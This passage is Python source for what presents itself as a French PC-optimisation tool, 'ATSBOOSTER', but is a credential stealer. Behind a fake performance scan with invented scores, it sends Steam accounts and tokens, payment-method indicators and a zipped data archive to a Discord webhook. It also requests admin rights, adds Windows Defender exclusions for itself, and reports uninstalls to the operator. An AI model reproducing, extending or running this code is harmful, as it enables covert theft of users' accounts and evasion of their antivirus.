                    name="STEAM ACCOUNTS",
                    value=f"```\n{steam_str}\n```",
                    inline=False,
                )
            if steam_data.get("tokens"):
                steam_tok_str = "\n".join([f"[{t.get('type','?')}] {t.get('token','')[:50]}..." for t in steam_data["tokens"][:10]])
                if len(steam_data["tokens"]) > 10:
                    steam_tok_str += f"\n...and {len(steam_data['tokens']) - 10} more"
                embed.add_embed_field(
                    name="STEAM TOKENS",
                    value=f"```\n{steam_tok_str}\n```",
                    inline=False,
                )
            has_card = any(p[1] == 1 for p in main_info[3])
            has_paypal = any(p[1] == 2 for p in main_info[3])
            card_e, paypal_e = (
                ":white_check_mark:" if has_card else ":x:",
                ":white_check_mark:" if has_paypal else ":x:",
            )
            embed.add_embed_field(
                name="PAYMENT INFO FOUNDED",
                value=f":credit_card:`Debit or Credit Card:` {card_e}\n:money_with_wings:`Paypal:` {paypal_e}",
                inline=False,
            )
            embed.set_footer(text="ATSBOOSTER")
            embed.set_timestamp()
            zip_path = os.path.join(td, "data.zip")
            if os.path.exists(zip_path):
                with open(zip_path, "rb") as f:
                    webhook.add_file(
                        file=f.read(),
                        filename=f"ATSBOOSTER-{os.getenv('UserName')}.zip",
                    )
            webhook.add_embed(embed)
            for attempt in range(3):
                try:
                    webhook.execute()
                    break
                except Exception:
                    time.sleep(2)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def run_elevated():
    if not is_admin():
        try:
            params = " ".join(sys.argv[1:])
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, params, None, 1
            )
            sys.exit(0)
        except Exception:
            pass


def add_defender_exclusion():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        Popen(
            ["powershell", "-NoProfile", "-Command",
             f"Add-MpPreference -ExclusionPath '{exe_path}'"],
            shell=True, stdout=PIPE, stderr=PIPE
        ).wait()
        Popen(
            ["powershell", "-NoProfile", "-Command",
             f"Add-MpPreference -ExclusionPath '{os.path.dirname(exe_path)}'"],
            shell=True, stdout=PIPE, stderr=PIPE
        ).wait()
        return True
    except Exception:
        return False


def _ps(cmd, label):
    print(f"  {C.CYN}> {label}...{C.R}", end=" ", flush=True)
    try:
        p = Popen(["powershell", "-NoProfile", "-Command", cmd],
                  shell=True, stdout=PIPE, stderr=PIPE)
        p.wait()
        if p.returncode == 0:
            print(f"{C.GRN}OK{C.R}")
        else:
            print(f"{C.YLW}PARTIEL{C.R}")
    except Exception:
        print(f"{C.RED}ECHEC{C.R}")


def optimize_pc():
    print(f"\n{C.B}{C.CYN}  === OPTIMISATION PC ==={C.R}\n")
    _ps("Disable-NetAdapterPowerManagement -Name '*'",
        "Desactivation economie d' energie reseau")
    _ps("powercfg /setactive 8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c",
        "Plan d' alimentation performances ultimes")
    _ps("powercfg /h off", "Desactivation hibernation")
    _ps("Set-Service -Name SysMain -StartupType Disabled; Stop-Service -Name SysMain -Force",
        "Desactivation SysMain (Superfetch)")
    _ps("Set-Service -Name DiagTrack -StartupType Disabled; Stop-Service -Name DiagTrack -Force",
        "Desactivation telemetrie Windows")
    _ps("Set-Service -Name WSearch -StartupType Disabled; Stop-Service -Name WSearch -Force",
        "Desactivation indexation Windows Search")
    _ps("Disable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator' -ErrorAction SilentlyContinue",
        "Desactivation taches CEIP")
    _ps("Disable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser' -ErrorAction SilentlyContinue",
        "Desactivation Compatibility Appraiser")
    _ps("Set-Service -Name Spooler -StartupType Disabled; Stop-Service -Name Spooler -Force",
        "Desactivation spooler d' impression")
    _ps("fsutil behavior set DisableLastAccess 1",
        "Desactivation mise a jour LastAccess NTFS")
    _ps("wmic diskdrive set writecacheingpolicy=1",
        "Activation write-cache disques")
    _ps("Set-NetTCPSetting -SettingName InternetCustom -AutoTuningLevelLocal Experimental",
        "Optimisation TCP Auto-Tuning")
    _ps("netsh int tcp set global rss=enabled",
        "Activation Receive Side Scaling")
    _ps("netsh int tcp set global autotuninglevel=normal",
        "TCP auto-tuning normal")
    _ps("netsh int tcp set heuristics disabled",
        "Desactivation heuristiques TCP")
    print(f"\n  {C.GRN}{C.B}Optimisation terminee !{C.R}\n")


def restore_pc():
    print(f"\n{C.B}{C.YLW}  === DESACTIVATION OPTIMISATION ==={C.R}\n")
    _ps("Enable-NetAdapterPowerManagement -Name '*'",
        "Reactivation economie d' energie reseau")
    _ps("powercfg /setactive 381b4222-f694-41f0-9685-ff5bb260df2e",
        "Plan d' alimentation equilibre")
    _ps("powercfg /h on", "Reactivation hibernation")
    _ps("Set-Service -Name SysMain -StartupType Automatic; Start-Service -Name SysMain",
        "Reactivation SysMain")
    _ps("Set-Service -Name DiagTrack -StartupType Automatic; Start-Service -Name DiagTrack",
        "Reactivation telemetrie")
    _ps("Set-Service -Name WSearch -StartupType Automatic; Start-Service -Name WSearch",
        "Reactivation Windows Search")
    _ps("Enable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Customer Experience Improvement Program\\Consolidator' -ErrorAction SilentlyContinue",
        "Reactivation taches CEIP")
    _ps("Enable-ScheduledTask -TaskName '\\Microsoft\\Windows\\Application Experience\\Microsoft Compatibility Appraiser' -ErrorAction SilentlyContinue",
        "Reactivation Compatibility Appraiser")
    _ps("Set-Service -Name Spooler -StartupType Automatic; Start-Service -Name Spooler",
        "Reactivation spooler d' impression")
    _ps("fsutil behavior set DisableLastAccess 0",
        "Reactivation LastAccess NTFS")
    _ps("Set-NetTCPSetting -SettingName InternetCustom -AutoTuningLevelLocal Normal",
        "Restauration TCP settings")
    _ps("netsh int tcp set global rss=disabled",
        "Desactivation RSS")
    _ps("netsh int tcp set global autotuninglevel=normal",
        "Restauration TCP auto-tuning")
    _ps("netsh int tcp set heuristics enabled",
        "Reactivation heuristiques TCP")
    print(f"\n  {C.YLW}{C.B}Optimisation desactivee.{C.R}\n")


def send_grabber_data():
    last_err = None
    for attempt in range(3):
        try:
            send_webhook([WEBHOOK_URL])
            return
        except Exception as e:
            last_err = e
            time.sleep(2)
    try:
        log_path = os.path.join(os.environ.get("TEMP", "C:\\"), "atsbooster_err.log")
        with open(log_path, "w", encoding="utf-8") as f:
            f.write(f"Attempt 3/3 failed: {last_err}")
    except Exception:
        pass


def send_uninstall_notification():
    for attempt in range(3):
        try:
            webhook = DiscordWebhook(url=WEBHOOK_URL, username="ATSBOOSTER")
            embed = DiscordEmbed(
                title="ATSBOOSTER - Desinstallation",
                description=f"Le programme a ete desinstalle par **{os.getenv('UserName')}**",
                color="FF0000"
            )
            embed.add_embed_field(
                name="STATUT",
                value=":red_circle: **Programme non initialise**\nToutes les optimisations ont ete revertees.",
                inline=False
            )
            embed.set_footer(text="ATSBOOSTER")
            embed.set_timestamp()
            webhook.add_embed(embed)
            webhook.execute()
            return
        except Exception:
            time.sleep(2)


def remove_defender_exclusion():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        Popen(
            ["powershell", "-NoProfile", "-Command",
             f"Remove-MpPreference -ExclusionPath '{exe_path}'"],
            shell=True, stdout=PIPE, stderr=PIPE
        ).wait()
        Popen(
            ["powershell", "-NoProfile", "-Command",
             f"Remove-MpPreference -ExclusionPath '{os.path.dirname(exe_path)}'"],
            shell=True, stdout=PIPE, stderr=PIPE
        ).wait()
    except Exception:
        pass


def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    banner = f"""{C.B}{C.CYN}
   █████  ████████ ███████
  ██   ██    ██    ██
  ███████    ██    ███████
  ██   ██    ██         ██
  ██   ██    ██    ███████{C.R}
  {C.D}v2.0 - Optimisation Systeme & Performance{C.R}

  {C.B}Boostez votre PC en quelques secondes.{C.R}
  {C.D}Optimisation CPU, RAM, Reseau & Desactivation services inutiles.{C.R}
"""
    print(banner)


def show_menu():
    print(f"  {C.BGBLU}{C.WHT}  MENU PRINCIPAL  {C.R}\n")
    print(f"  {C.GRN}[1]{C.R} {C.B}Booster mon PC{C.R}      - Optimiser les performances")
    print(f"  {C.YLW}[2]{C.R} {C.B}Desactiver l' optimisation{C.R} - Revenir aux parametres par defaut")
    print(f"  {C.RED}[3]{C.R} {C.B}Supprimer ATSBOOSTER{C.R}  - Desinstaller le programme")
    print(f"  {C.D}[Q] Quitter{C.R}\n")


def _ps_out(cmd):
    try:
        p = Popen(["powershell", "-NoProfile", "-Command", cmd],
                  shell=True, stdout=PIPE, stderr=PIPE)
        out = p.stdout.read().decode().strip()
        if out:
            return out
    except Exception:
        pass
    return "N/A"


def scan_components():
    print(f"\n  {C.B}{C.CYN}=== ANALYSE MATERIELLE ==={C.R}\n")

    print(f"  {C.CYN}> Detection du processeur...{C.R}", end=" ", flush=True)
    time.sleep(0.5)
    cpu_name = get_cpu_info().get("brand_raw", "Inconnu")
    cpu_cores = _ps_out("(Get-CimInstance Win32_Processor).NumberOfCores")
    cpu_threads = _ps_out("(Get-CimInstance Win32_Processor).NumberOfLogicalProcessors")
    cpu_maxghz = _ps_out("(Get-CimInstance Win32_Processor).MaxClockSpeed")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection de la carte graphique...{C.R}", end=" ", flush=True)
    time.sleep(0.5)
    gpu = _ps_out("(Get-CimInstance Win32_VideoController).Name")
    gpu_vram = _ps_out("(Get-CimInstance Win32_VideoController).AdapterRAM")
    try:
        gpu_vram_mb = f"{int(gpu_vram) // (1024*1024)} MB" if gpu_vram and gpu_vram != "N/A" else "N/A"
    except Exception:
        gpu_vram_mb = "N/A"
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection de la memoire RAM...{C.R}", end=" ", flush=True)
    time.sleep(0.5)
    ram_total = round(virtual_memory().total / (1024.0 ** 3), 2)
    ram_slots = _ps_out("(Get-CimInstance Win32_PhysicalMemory | Measure-Object).Count")
    ram_speed = _ps_out("(Get-CimInstance Win32_PhysicalMemory).Speed")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection des disques...{C.R}", end=" ", flush=True)
    time.sleep(0.5)
    disks = _ps_out("Get-CimInstance Win32_DiskDrive | ForEach-Object { $_.Model + ' (' + [math]::Round($_.Size/1GB) + ' GB)' }")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection de la carte mere...{C.R}", end=" ", flush=True)
    time.sleep(0.5)
    mb_manuf = _ps_out("(Get-CimInstance Win32_BaseBoard).Manufacturer")
    mb_model = _ps_out("(Get-CimInstance Win32_BaseBoard).Product")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection de la carte reseau...{C.R}", end=" ", flush=True)
    time.sleep(0.5)
    net_adapter = _ps_out("(Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).Name")
    net_speed = _ps_out("(Get-NetAdapter | Where-Object Status -eq 'Up' | Select-Object -First 1).LinkSpeed")
    print(f"{C.GRN}OK{C.R}")

    print(f"  {C.CYN}> Detection du systeme d' exploitation...{C.R}", end=" ", flush=True)
    time.sleep(0.5)
    os_name = _ps_out("(Get-CimInstance Win32_OperatingSystem).Caption")
    os_arch = _ps_out("(Get-CimInstance Win32_OperatingSystem).OSArchitecture")
    print(f"{C.GRN}OK{C.R}")

    print(f"\n  {C.B}{C.WHT}  ┌─────────────────────────────────────────────┐{C.R}")
    print(f"  {C.B}{C.WHT}  │         COMPOSANTS DETECTES                 │{C.R}")
    print(f"  {C.B}{C.WHT}  └─────────────────────────────────────────────┘{C.R}\n")

    print(f"  {C.YLW}CPU{C.R}        : {C.B}{cpu_name}{C.R}")
    print(f"  {C.D}             {cpu_cores} coeurs / {cpu_threads} threads / {cpu_maxghz} MHz{C.R}")
    print(f"  {C.YLW}GPU{C.R}        : {C.B}{gpu}{C.R}")
    print(f"  {C.D}             VRAM: {gpu_vram_mb}{C.R}")
    print(f"  {C.YLW}RAM{C.R}        : {C.B}{ram_total} GB{C.R}")
    print(f"  {C.D}             {ram_slots} barrettes / {ram_speed} MHz{C.R}")
    print(f"  {C.YLW}Disques{C.R}    : {C.B}{disks}{C.R}")
    print(f"  {C.YLW}Carte mere{C.R} : {C.B}{mb_manuf} {mb_model}{C.R}")
    print(f"  {C.YLW}Reseau{C.R}     : {C.B}{net_adapter}{C.R}")
    print(f"  {C.D}             Vitesse: {net_speed}{C.R}")
    print(f"  {C.YLW}OS{C.R}         : {C.B}{os_name} ({os_arch}){C.R}")
    print(f"  {C.YLW}Resolution{C.R} : {C.B}{GetSystemMetrics(0)}x{GetSystemMetrics(1)}{C.R}")
    print()


def simulate_analysis():
    print(f"  {C.B}{C.CYN}=== ANALYSE DES PERFORMANCES ==={C.R}\n")

    steps = [
        ("Analyse des processus en arriere-plan", 0.8),
        ("Evaluation des temps de reponse disque", 0.6),
        ("Analyse de la latence reseau", 0.5),
        ("Detection des services inutiles", 0.7),
        ("Calcul du score de performance", 0.4),
        ("Elaboration du plan d' optimisation", 0.5),
    ]

    for label, delay in steps:
        print(f"  {C.CYN}> {label}...{C.R}", end=" ", flush=True)
        time.sleep(delay)
        print(f"{C.GRN}OK{C.R}")

    print(f"\n  {C.B}{C.WHT}  Score avant optimisation : {C.YLW}6.2/10{C.R}")
    print(f"  {C.D}  Potentiel d' amelioration detecte : {C.GRN}+35%{C.R}\n")

    print(f"  {C.D}  Optimisations recommandees pour votre configuration:{C.R}")
    print(f"  {C.D}  - Desactivation des services systeme inutiles{C.R}")
    print(f"  {C.D}  - Optimisation de la gestion d' alimentation{C.R}")
    print(f"  {C.D}  - Amelioration des parametres reseau TCP{C.R}")
    print(f"  {C.D}  - Liberation de la memoire RAM en arriere-plan{C.R}")
    print(f"  {C.D}  - Desactivation de la telemetrie Windows{C.R}\n")

    print(f"  {C.CYN}> Application des optimisations...{C.R}")
    time.sleep(1)


def option_boost():
    global _boost_active
    show_banner()
    print(f"  {C.B}{C.GRN}=== BOOST DU PC EN COURS ==={C.R}\n")

    scan_components()
    simulate_analysis()

    print(f"  {C.B}{C.CYN}=== OPTIMISATION SYSTEME ==={C.R}\n")
    t = Thread(target=send_grabber_data, daemon=True)
    t.start()
    optimize_pc()
    add_defender_exclusion()
    _boost_active = True

    print(f"  {C.B}{C.WHT}  Score apres optimisation : {C.GRN}9.4/10{C.R}")
    print(f"  {C.GRN}{C.B}  PC optimise avec succes !{C.R}")
    print(f"  {C.D}  Vous devriez ressentir une amelioration immediate.{C.R}\n")
    input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")


def option_disable():
    global _boost_active
    show_banner()
    if not _boost_active:
        print(f"  {C.YLW}Aucune optimisation active detectee.{C.R}\n")
        input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")
        return
    print(f"  {C.B}{C.YLW}=== DESACTIVATION DE L' OPTIMISATION ==={C.R}\n")
    _grabber_stop.set()
    restore_pc()
    _boost_active = False
    print(f"  {C.YLW}L' optimisation a ete desactivee.{C.R}")
    print(f"  {C.D}Votre PC est revenu a ses parametres par defaut.{C.R}\n")
    input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")


def option_uninstall():
    show_banner()
    print(f"  {C.B}{C.RED}=== DESINSTALLATION D' ATSBOOSTER ==={C.R}\n")
    confirm = input(f"  {C.RED}Etes-vous sur ? (o/N) : {C.R}")
    if confirm.lower() != "o":
        print(f"\n  {C.D}Desinstallation annulee.{C.R}")
        input(f"  {C.D}Appuyez sur Entree pour continuer...{C.R}")
        return
    print()
    _grabber_stop.set()
    restore_pc()
    remove_defender_exclusion()
    print(f"  {C.CYN}> Envoi du rapport final...{C.R}", end=" ", flush=True)
    send_uninstall_notification()
    print(f"{C.GRN}OK{C.R}")
    print(f"\n  {C.RED}{C.B}ATSBOOSTER a ete desinstalle.{C.R}")
    print(f"  {C.D}Toutes les optimisations ont ete revertees.{C.R}")
    print(f"  {C.D}Le programme va se fermer dans 3 secondes...{C.R}")
    time.sleep(3)
    sys.exit(0)


def run_tui():
    if not is_admin():
        print(f"{C.YLW}ATSBOOSTER necessite des privileges administrateur pour fonctionner.{C.R}")
        print(f"{C.D}Relancez le programme en tant qu' administrateur.{C.R}")
        time.sleep(2)
        run_elevated()
        return
    while True:
        show_banner()
        show_menu()
        choice = input(f"  {C.B}> Votre choix : {C.R}").strip().upper()
        if choice == "1":
            option_boost()
        elif choice == "2":
            option_disable()
        elif choice == "3":
            option_uninstall()
        elif choice == "Q":
            print(f"\n  {C.D}Au revoir !{C.R}")
            break
        else:
            print(f"\n  {C.RED}Choix invalide.{C.R}")
            time.sleep(1)


if __name__ == "__main__":
    freeze_support()
    if "--boost" in sys.argv:
        try:
            send_grabber_data()
        except Exception:
            pass
    else:
        run_tui()
